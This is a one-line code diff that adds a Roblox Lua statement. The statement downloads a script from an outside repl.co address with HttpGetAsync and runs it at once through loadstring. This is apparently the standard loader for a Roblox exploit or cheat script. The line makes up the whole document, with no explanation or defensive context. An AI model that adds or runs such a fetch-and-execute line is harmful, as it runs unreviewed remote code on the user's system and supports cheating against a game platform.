@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync('https://ce.scriptemt.repl.co/Neurav', true))()
